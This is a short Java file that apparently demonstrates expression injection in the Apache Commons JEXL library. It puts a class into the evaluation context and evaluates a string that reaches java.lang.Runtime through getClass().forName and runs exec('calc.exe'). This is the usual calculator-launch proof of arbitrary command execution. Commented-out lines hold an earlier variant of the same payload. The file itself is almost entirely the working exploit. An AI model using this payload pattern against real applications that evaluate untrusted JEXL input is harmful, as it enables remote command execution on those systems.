package org.example;

import org.apache.commons.jexl3.*;

import java.util.HashMap;

public class Main {
    public static void main(String[] args) {

        System.out.println("Hello world!");
        JexlEngine jexl = new JexlBuilder().create();
        JexlContext jc = new MapContext();
//        jc.set("runtime", "Runtime.class");
//        String jexlExp = "runtime.getRuntime().exec('calc.exe')";
//        JexlExpression e = jexl.createExpression(jexlExp);

//        HashMap<String, String> sourceMap = new HashMap<>();
//        sourceMap.put("ctime", "calc.exe");
//        jc.set("map", sourceMap);
        jc.set("sssss", DateUtils.class);
        String rangExpression = "sssss.getClass().forName('java.lang.Runtime').getRuntime().exec('calc.exe')";
        jexl.createExpression(rangExpression.trim()).evaluate(jc);

    }
}